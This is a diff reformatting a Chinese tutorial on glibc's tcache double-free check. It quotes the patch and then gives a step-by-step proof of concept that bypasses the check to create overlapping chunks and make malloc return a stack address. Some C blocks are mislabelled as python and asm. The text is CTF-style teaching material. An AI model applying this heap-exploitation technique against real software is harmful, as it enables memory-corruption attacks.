@@ -15,81 +15,17 @@
 这个部分位于单链表结构中的`bk`位置
 
 
-```
-
-/* @@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size) */
-
-
-/* We overlay this structure on the user-data portion of a chunk when
-
+```c
+ /* @@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size) */
+ /* We overlay this structure on the user-data portion of a chunk when
     the chunk is stored in the per-thread cache.  */
-
-
-@@
-
--2967
-,
-6
-
-+
-2967
-,
-8
-
-@@
-
-mremap_chunk
-
-(
-mchunkptr
-
-p
-,
-
-size_t
-
-new_size
-)
-
-
-typedef
-
-struct
-
-tcache_entry
-
-
-{
-
-
-struct
-
-tcache_entry
-
-*
-next
-;
-
-+
-
-/* This field exists to detect double frees.  */
-
-+
-
-struct
-
-tcache_perthread_struct
-
-*
-key
-;
-
-
-}
-
-tcache_entry
-;
-
+ @@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
+ typedef struct tcache_entry
+ {
+   struct tcache_entry *next;
++  /* This field exists to detect double frees.  */
++  struct tcache_perthread_struct *key;
+ } tcache_entry;
 ```
 
 该字段的相关宏被添加到了`tcache_put`和`tcache_get`函数中,后文会提到
@@ -100,119 +36,18 @@ tcache_entry
 
 
 ```
-
-/* @@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) */
-
-
-/* 调用者必须确保我们知道 tc_idx 是有效的，并且有足够的空间来存放更多的块。 */
-
-
-static
-
-__always_inline
-
-void
-
-
-tcache_put
-
-(
-mchunkptr
-
-chunk
-,
-
-size_t
-
-tc_idx
-)
-
-
-{
-
-
-tcache_entry
-
-*
-e
-
-=
-
-(
-tcache_entry
-
-*
-)
-
-chunk2mem
-
-(
-chunk
-);
-
-
-/* 将这个块标记为“在 tcache 中”，这样在 _int_free 中的测试就可以检测到双重释放。 */
-
-+
-
-e
-->
-key
-
-=
-
-tcache_key
-;
-
-
-e
-->
-next
-
-=
-
-PROTECT_PTR
-
-(
-&
-e
-->
-next
-,
-
-tcache
-->
-entries
-[
-tc_idx
-]);
-
-
-tcache
-->
-entries
-[
-tc_idx
-]
-
-=
-
-e
-;
-
-
-++
-(
-tcache
-->
-counts
-[
-tc_idx
-]);
-
-
-}
-
+ /* @@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) */
+ /* 调用者必须确保我们知道 tc_idx 是有效的，并且有足够的空间来存放更多的块。 */
+ static __always_inline void
+ tcache_put (mchunkptr chunk, size_t tc_idx)
+ {
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  /* 将这个块标记为“在 tcache 中”，这样在 _int_free 中的测试就可以检测到双重释放。 */
++ e->key = tcache_key;
+  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
+  tcache->entries[tc_idx] = e;
+  ++(tcache->counts[tc_idx]);
+ }
 ```
 
 **tcache\_get中的更改**
@@ -220,77 +55,14 @@ tc_idx
 这里添加了`(e->key=NULL)`，它将`e`指向的结构体中的`key`成员赋为`null`。它可以清除`key`中的信息，以确保元素从缓存中移除后不会指向无效的内存 <= 删除了一个野指针
 
 
-```
-
-/* @@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) */
-
-
-assert
-
-(
-tcache
-->
-entries
-[
-tc_idx
-]
-
->
-
-0
-);
-
-
-tcache
-->
-entries
-[
-tc_idx
-]
-
-=
-
-e
-->
-next
-;
-
-
---
-(
-tcache
-->
-counts
-[
-tc_idx
-]);
-
-+
-
-e
-->
-key
-
-=
-
-NULL
-;
-
-
-return
-
-(
-void
-
-*
-)
-
-e
-;
-
-
-}
-
+```c
+  /* @@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) */
+  assert (tcache->entries[tc_idx] > 0);
+  tcache->entries[tc_idx] = e->next;
+  --(tcache->counts[tc_idx]);
++ e->key = NULL;
+  return (void *) e;
+ }
 ```
 
 **\_int\_free中的更改**
@@ -300,230 +72,27 @@ e
 接下来又写了个巧合验证：这个检查可能巧合地与内存中的其它数据匹配，因此并非完全可靠。于是设置了一个循环，验证`tcache`不为`NULL`，然后检查`e->key`是否等于`tcache`
 
 
-```
-
-@@
-
--4218
-,
-6
-
+```python
+ @@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
+ {
+  size_t tc_idx = csize2tidx (size);
++ /* 检查它是否已经在 tcache 中。 */
++ tcache_entry *e = (tcache_entry *) chunk2mem (p);
 +
-4226
-,
-26
-
-@@
-
-_int_free
-
-(
-mstate
-
-av
-,
-
-mchunkptr
-
-p
-,
-
-int
-
-have_lock
-)
-
-
-{
-
-
-size_t
-
-tc_idx
-
-=
-
-csize2tidx
-
-(
-size
-);
-
-+
-
-/* 检查它是否已经在 tcache 中。 */
-
-+
-
-tcache_entry
-
-*
-e
-
-=
-
-(
-tcache_entry
-
-*
-)
-
-chunk2mem
-
-(
-p
-);
-
-+
-
-+
-
-/* 这个测试在双重释放时会成功。然而，我们不 100% 信任它
-
++ /* 这个测试在双重释放时会成功。然而，我们不 100% 信任它
     （它也可能以 1 in 2^<size_t> 的几率与随机的 payload 数据匹配）
-
      所以在中止前验证这是否并非一个不太可能的巧合。 */
-
++ if (__glibc_unlikely (e->key == tcache && tcache))
++ {
++   tcache_entry *tmp;
++   LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
++   for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
++       if (tmp == e)
++           malloc_printerr ("free(): double free detected in tcache 2");
++   /* 如果我们到达这里，那是个巧合。我们浪费了一些周期，但不会中止。 */
++ }
 +
-
-if
-
-(
-__glibc_unlikely
-
-(
-e
-->
-key
-
-==
-
-tcache
-
-&&
-
-tcache
-))
-
-+
-
-{
-
-+
-
-tcache_entry
-
-*
-tmp
-;
-
-+
-
-LIBC_PROBE
-
-(
-memory_tcache_double_free
-,
-
-2
-,
-
-e
-,
-
-tc_idx
-);
-
-+
-
-for
-
-(
-tmp
-
-=
-
-tcache
-->
-entries
-[
-tc_idx
-];
-
-tmp
-;
-
-tmp
-
-=
-
-tmp
-->
-next
-)
-
-+
-
-if
-
-(
-tmp
-
-==
-
-e
-)
-
-+
-
-malloc_printerr
-
-(
-"free(): double free detected in tcache 2"
-);
-
-+
-
-/* 如果我们到达这里，那是个巧合。我们浪费了一些周期，但不会中止。 */
-
-+
-
-}
-
-+
-
-
-if
-
-(
-tcache
-
-&&
-
-tc_idx
-
-<
-
-mp_
-.
-tcache_bins
-
-&&
-
-tcache
-->
-counts
-[
-tc_idx
-]
-
-<
-
-mp_
-.
-tcache_count
-)
-
+  if (tcache && tc_idx < mp_.tcache_bins && tcache->counts[tc_idx] < mp_.tcache_count)
 ```
 
 
@@ -535,14 +104,7 @@ tcache_count
 
 
 ```
-
-intptr_t
-
-stack_var
-[
-4
-];
-
+intptr_t stack_var[4];
 ```
 
 分配7个块来准备合适的堆布局，填满 tcache
@@ -551,92 +113,13 @@ stack_var
 
 
 ```
-
-intptr_t
-
-*
-x
-[
-7
-];
-
-for
-
-(
-int
-
-i
-
-=
-
-0
-;
-
-i
-
-<
-
-sizeof
-(
-x
-)
-/
-sizeof
-(
-intptr_t
-*
-);
-
-i
-++
-)
-
-{
-
-
-x
-[
-i
-]
-
-=
-
-malloc
-(
-0x100
-);
-
+intptr_t *x[7];
+for (int i = 0; i < sizeof(x)/sizeof(intptr_t*); i++) {
+    x[i] = malloc(0x100);
 }
-
-intptr_t
-
-*
-prev
-
-=
-
-malloc
-(
-0x100
-);
-
-intptr_t
-
-*
-a
-
-=
-
-malloc
-(
-0x100
-);
-
-malloc
-(
-0x10
-);
-
+intptr_t *prev = malloc(0x100);
+intptr_t *a = malloc(0x100);
+malloc(0x10);
 ```
 
 此时的堆布局如下图：
@@ -649,66 +132,23 @@ malloc
 
 
 ```
-
-for
-
-(
-int
-
-i
-
-=
-
-0
-;
-
-i
-
-<
-
-7
-;
-
-i
-++
-)
-
-{
-
-
-free
-(
-x
-[
-i
-]);
-
+for (int i = 0; i < 7; i++) {
+    free(x[i]);
 }
-
 ```
 
 1. 释放攻击块`a`，使其到达ub中
 
 
 ```
-
-free
-(
-a
-);
-
+free(a);
 ```
 
 1. 释放前置块`prev`,使之与攻击块`a`合并
 
 
 ```
-
-free
-(
-prev
-);
-
+free(prev);
 ```
 
 此时的chunk构造如下：
@@ -721,17 +161,8 @@ prev
 
 
 ```
-
-malloc
-(
-0x100
-);
-
-free
-(
-a
-);
-
+malloc(0x100);
+free(a);
 ```
 
 > 我们可以这么做的原因很简单：攻击块的指针是在他被释放到ub中生成的，因此，现在这些指针和tcache、key没有任何关系，所以我们可以绕过上面提及的安全检查
@@ -739,25 +170,8 @@ a
 >
 
 ```
-
-e
-->
-key
-
-=
-
-tcache_key
-;
-
-e
-->
-key
-
-=
-
-null
-;
-
+e->key = tcache_key;
+e->key = null;
 ```
 
 这就导致了\*\*攻击块`a`同时位于tcache和ub中\*\*
@@ -772,163 +186,26 @@ null
 那么我们现在就拥有了`chunk overlapping`，`prev`的大小是0x220；`a`的大小是`0x110`
 
 
-```
+```asm
+a = (intptr_t*)malloc(0x100);
+int a_size = a[-1] & 0xff0;
+printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
 
-a
+puts("Get the target chunk from tcache.");
+intptr_t *target = (intptr_t*)malloc(0x100);
+target[0] = 0xcafebabe;
 
-=
-
-(
-intptr_t
-*
-)
-malloc
-(
-0x100
-);
-
-int
-
-a_size
-
-=
-
-a
-[
--1
-]
-
-&
-
-0xff0
-;
-
-printf
-(
-"victim @ %p, size: %#x, end @ %p
-\n
-"
-,
-
-a
-,
-
-a_size
-,
-
-(
-void
-
-*
-)
-a
-+
-a_size
-);
-
-puts
-(
-"Get the target chunk from tcache."
-);
-
-intptr_t
-
-*
-target
-
-=
-
-(
-intptr_t
-*
-)
-malloc
-(
-0x100
-);
-
-target
-[
-0
-]
-
-=
-
-0xcafebabe
-;
-
-printf
-(
-"target @ %p == stack_var @ %p
-\n
-"
-,
-
-target
-,
-
-stack_var
-);
-
-assert
-(
-stack_var
-[
-0
-]
-
-==
-
-0xcafebabe
-);
-
+printf("target @ %p == stack_var @ %p\n", target, stack_var);
+assert(stack_var[0] == 0xcafebabe);
 ```
 
 实现如下效果
 
 
 ```
-
-victim
-
-@
-
-0x55e6d4cb8b20,
-
-size:
-
-0x110,
-
-end
-
-@
-
-0x55e6d4cb8c30
-Get
-
-the
-
-target
-
-chunk
-
-from
-
-tcache.
-target
-
-@
-
-0x7ffe559bcd70
-
-==
-
-stack_var
-
-@
-
-0x7ffe559bcd70
-
+victim @ 0x55e6d4cb8b20, size: 0x110, end @ 0x55e6d4cb8c30
+Get the target chunk from tcache.
+target @ 0x7ffe559bcd70 == stack_var @ 0x7ffe559bcd70
 ```
 
 \*以后遇到合适的题补充一个实战
